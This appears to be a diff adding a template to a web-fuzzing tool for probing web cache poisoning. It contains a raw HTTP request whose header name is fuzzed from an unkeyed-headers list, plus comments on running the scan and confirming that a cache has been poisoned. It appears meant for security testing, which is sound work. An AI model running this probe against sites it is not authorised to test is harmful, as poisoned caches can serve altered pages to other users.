@@ -1,0 +1,29 @@
+# Cache-poisoning probe template.
+#
+# Edit the Host header below to YOUR target. Then run:
+#
+#   python3 intruder.py examples/cache-poison-template.txt \
+#       --payload unkeyed-headers.txt \
+#       --mode sniper \
+#       --match-length "!<baseline-length>" \
+#       --max-rps 10
+#
+# The §HEADER§ marker iterates through every header name in
+# unkeyed-headers.txt. Each request adds ONE unkeyed header (with
+# a fixed sentinel value) to the otherwise-vanilla request.
+#
+# Hunt for responses whose length DIFFERS from the baseline -
+# that's the signal that the unkeyed header reached the application
+# logic. Send the same request a second time (without the unkeyed
+# header) - if the cached version still includes the modification,
+# you've poisoned the cache.
+#
+# Set the sentinel to something traceable: your OAST host, a unique
+# word, or a known reflection target. We use 'cachepoison-probe' so
+# you can grep for it in responses.
+GET / HTTP/1.1
+Host: YOUR-TARGET.example.com
+User-Agent: Mozilla/5.0
+Accept: */*
+§HEADER§: cachepoison-probe.example.com
+
